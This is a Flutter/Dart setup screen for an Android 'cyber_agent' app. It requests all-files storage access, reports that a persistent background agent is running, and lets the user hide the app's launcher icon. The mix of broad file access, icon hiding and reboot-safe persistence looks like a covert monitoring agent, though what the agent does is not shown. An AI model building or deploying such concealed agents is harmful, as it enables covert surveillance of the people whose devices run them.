import 'dart:async';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:shared_preferences/shared_preferences.dart';

import 'core/device_agent.dart';

class SetupScreen extends StatefulWidget {
  const SetupScreen({super.key});

  @override
  State<SetupScreen> createState() => _SetupScreenState();
}

class _SetupScreenState extends State<SetupScreen> {
  static const MethodChannel _permChannel =
      MethodChannel('cyber_agent/permissions');

  static const MethodChannel _appHiderChannel =
      MethodChannel('cyber_agent/app_hider');

  bool _storageGranted = false;
  bool _agentRunning = false;
  bool _iconVisible = true;
  String _status = 'Checking setup...';
  String? _deviceId;

  @override
  void initState() {
    super.initState();
    _loadState();
  }

  Future<void> _loadState() async {
    await _loadDeviceId();
    await _checkPermissions();
    await _checkIconState();
    await _checkAgent();
  }

  Future<void> _loadDeviceId() async {
    final prefs = await SharedPreferences.getInstance();
    setState(() {
      _deviceId = prefs.getString('device_id');
    });
  }

  Future<void> _checkPermissions() async {
    try {
      final map =
          await _permChannel.invokeMethod<Map>('checkStoragePermissions');
      final hasAllFiles = map?['hasAllFilesAccess'] == true;

      setState(() {
        _storageGranted = hasAllFiles;
        _status = hasAllFiles
            ? 'Permissions OK'
            : 'Storage permission required';
      });
    } catch (e) {
      setState(() {
        _status = 'Permission check failed';
      });
    }
  }

  Future<void> _requestPermissions() async {
    try {
      await _permChannel.invokeMethod('requestManageAllFilesAccess');
      await Future.delayed(const Duration(seconds: 1));
      await _checkPermissions();
    } catch (_) {}
  }

  Future<void> _checkAgent() async {
    setState(() {
      _agentRunning = true; // agent is sticky background
    });
  }

  Future<void> _checkIconState() async {
    try {
      final visible =
          await _appHiderChannel.invokeMethod<bool>('isVisible');
      setState(() {
        _iconVisible = visible ?? true;
      });
    } catch (_) {}
  }

  Future<void> _hideIcon() async {
    try {
      await _appHiderChannel.invokeMethod('hide');
      setState(() {
        _iconVisible = false;
      });
    } catch (_) {}
  }

  Future<void> _showIcon() async {
    try {
      await _appHiderChannel.invokeMethod('show');
      setState(() {
        _iconVisible = true;
      });
    } catch (_) {}
  }

  Widget _section(String title, List<Widget> children) {
    return Card(
      margin: const EdgeInsets.symmetric(vertical: 8),
      child: Padding(
        padding: const EdgeInsets.all(12),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Text(title,
                style:
                    const TextStyle(fontSize: 16, fontWeight: FontWeight.bold)),
            const SizedBox(height: 8),
            ...children,
          ],
        ),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text('Agent Setup'),
        centerTitle: true,
      ),
      body: ListView(
        padding: const EdgeInsets.all(12),
        children: [
          Text(_status),
          const SizedBox(height: 12),

          _section('Device', [
            Text('Device ID: ${_deviceId ?? "not created"}'),
            Text('Agent running: ${_agentRunning ? "YES" : "NO"}'),
          ]),

          _section('Permissions', [
            Text('Storage access: ${_storageGranted ? "GRANTED" : "MISSING"}'),
            if (!_storageGranted)
              ElevatedButton(
                onPressed: _requestPermissions,
                child: const Text('Grant storage permission'),
              ),
          ]),

          _section('App Visibility', [
            Text('Launcher icon: ${_iconVisible ? "VISIBLE" : "HIDDEN"}'),
            const SizedBox(height: 8),
            if (_iconVisible)
              ElevatedButton(
                onPressed: _hideIcon,
                child: const Text('Hide app icon'),
              )
            else
              ElevatedButton(
                onPressed: _showIcon,
                child: const Text('Restore app icon'),
              ),
          ]),

          _section('Info', const [
            Text(
              '• App will continue running in background\n'
              '• Icon hiding is reversible\n'
              '• Reboot-safe\n'
              '• No accessibility abuse',
            ),
          ]),
        ],
      ),
    );
  }
}
